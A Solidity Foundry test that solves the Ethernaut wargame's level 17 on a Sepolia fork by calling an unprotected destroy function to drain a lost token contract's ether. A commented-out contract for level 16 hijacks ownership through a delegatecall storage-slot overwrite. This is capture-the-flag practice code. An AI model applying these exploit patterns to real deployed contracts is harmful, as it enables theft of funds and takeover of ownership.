// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

interface ISimpleToken {
    function transfer(address _to, uint256 _amount) external;

    function destroy(address payable _to) external;
}

contract ContractTest is Test {
    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"), 6631629); // personal time when create the contract

        vm.label(address(this), "Attacker");
        vm.label(
            address(0xc4486357429EB17E573a34cBBDDE0050A54110B7),
            "Ethernaut17"
        );
    }

    function testEthernaut17() public {
        // check we got the right deployed contract
        assert(
            payable(0xc4486357429EB17E573a34cBBDDE0050A54110B7).balance ==
                (1 * (10 ** 18) * 0.001)
        );
        address payable to = payable(address(this));
        ISimpleToken(payable(0xc4486357429EB17E573a34cBBDDE0050A54110B7))
            .destroy(to);
        assert(
            payable(0xc4486357429EB17E573a34cBBDDE0050A54110B7).balance == 0
        );
    }

    receive() external payable {}
}

// contract AttackContract {
//     address public tz1_lib;
//     address public tz2_lib;
//     address public owner;

//     Preservation level16 =
//         Preservation(payable(0xa808f0ca798Bd41c5985b887F407754a36cebB57));

//     function trigger() public {
//         address addr = address(this);
//         level16.setSecondTime(uint256(uint160(addr)));
//         level16.setFirstTime(uint256(uint160(addr)));
//     }

//     function setTime(uint256 _timestamp) public {
//         console.log("set owner as player");

//         owner = address(uint160(_timestamp));
//     }
// }
